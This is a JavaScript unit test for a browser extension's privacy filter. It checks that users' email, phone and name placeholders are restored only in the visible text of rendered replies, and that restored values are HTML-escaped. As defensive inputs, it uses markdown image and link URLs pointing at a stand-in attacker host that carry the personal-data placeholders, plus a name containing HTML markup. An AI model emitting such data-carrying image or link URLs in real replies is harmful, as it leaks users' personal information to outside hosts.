// scripts/test-pii-restore.mjs
//
// Unit test for S-03: restoreInHtmlText() puts the user's values back in the
// TEXT of a rendered reply only. Run with:  node scripts/test-pii-restore.mjs
// (markdown.js resolves link/image URLs against `location`, so a stub is set.)

import assert from "node:assert/strict";

globalThis.location = { href: "chrome-extension://testid/sidepanel/sidepanel.html" };
const { markdownToHtml } = await import("../sidepanel/rendering/markdown.js");
const pii = await import("../privacy/pii-filter.js");

const results = [];
function test(name, fn) {
  try { fn(); results.push(true); console.log(`PASS  ${name}`); }
  catch (err) { results.push(false); console.log(`FAIL  ${name}\n      ${String(err?.message || err).split("\n").join("\n      ")}`); }
}
const MAP = { "[EMAIL#1]": "alice@corp.example", "[PHONE#1]": "+1 415 555 0134", "[NAME#1]": 'Tom <b>"T"</b> & Co' };
const render = (md) => pii.restoreInHtmlText(markdownToHtml(md), MAP);

test("text, bold, code and list items are restored", () => {
  const html = render("Mail [EMAIL#1] or **[PHONE#1]** or `[EMAIL#1]`\n\n- item [EMAIL#1]");
  assert.equal(html.includes("[EMAIL#1]"), false);
  assert.ok(html.includes("alice@corp.example") && html.includes("+1 415 555 0134"));
});

test("an image URL and a link target keep their placeholders", () => {
  const html = render("![x](https://evil.example/c?d=[EMAIL#1]) and [go](https://evil.example/?p=[PHONE#1])");
  assert.ok(/src="[^"]*\[EMAIL#1\]/.test(html), html);
  assert.ok(/href="[^"]*\[PHONE#1\]/.test(html), html);
  assert.ok(!html.includes("alice@corp.example") && !html.includes("415"), html);
});

test("alt text is display text and is restored; the URL next to it is not", () => {
  const html = pii.restoreInHtmlText('<img src="https://h.example/?q=[EMAIL#1]" alt="photo [EMAIL#1]" loading="lazy">', MAP);
  assert.ok(html.includes('alt="photo alice@corp.example"'), html);
  assert.ok(html.includes('src="https://h.example/?q=[EMAIL#1]"'), html);
});

test("a restored value is HTML-escaped: it can never become markup", () => {
  const html = render("Hello [NAME#1]!");
  assert.ok(!html.includes("<b>"), html);
  assert.ok(html.includes("Tom &lt;b&gt;&quot;T&quot;&lt;/b&gt; &amp; Co"), html);
});

test("an escaped placeholder (\\[EMAIL#1\\]) is restored in text too; unknown placeholders stay", () => {
  const html = render("Write \\[EMAIL#1\\] or [EMAIL#9]");
  assert.ok(html.includes("alice@corp.example") && html.includes("[EMAIL#9]"), html);
});

test("a value that contains a placeholder is restored through (up to 3 levels)", () => {
  const map = { "[A#1]": "x [B#1] y", "[B#1]": "real" };
  assert.equal(pii.restoreInHtmlText("<p>[A#1]</p>", map), "<p>x real y</p>");
});

test("no map / no brackets: the HTML is returned unchanged", () => {
  assert.equal(pii.restoreInHtmlText("<p>hi</p>", MAP), "<p>hi</p>");
  assert.equal(pii.restoreInHtmlText("<p>[EMAIL#1]</p>", null), "<p>[EMAIL#1]</p>");
});

test("restoreWithMap restores everywhere (plain text); sanitizePiiMap/usedPiiMap validate and trim", () => {
  assert.equal(pii.restoreWithMap("a [EMAIL#1] b", MAP), "a alice@corp.example b");
  assert.deepEqual(pii.sanitizePiiMap({ "[EMAIL#1]": "x", "EMAIL": "bad", "[A#2]": 5, "[B#1]": "y".repeat(5000) }), { "[EMAIL#1]": "x" });
  assert.equal(pii.sanitizePiiMap([1, 2]), null);
  assert.equal(pii.sanitizePiiMap("x"), null);
  assert.deepEqual(pii.usedPiiMap("only [EMAIL#1] here", MAP), { "[EMAIL#1]": "alice@corp.example" });
  assert.equal(pii.usedPiiMap("nothing", MAP), null);
});

console.log(`\n${results.filter(Boolean).length}/${results.length} passed`);
process.exit(results.every(Boolean) ? 0 : 1);
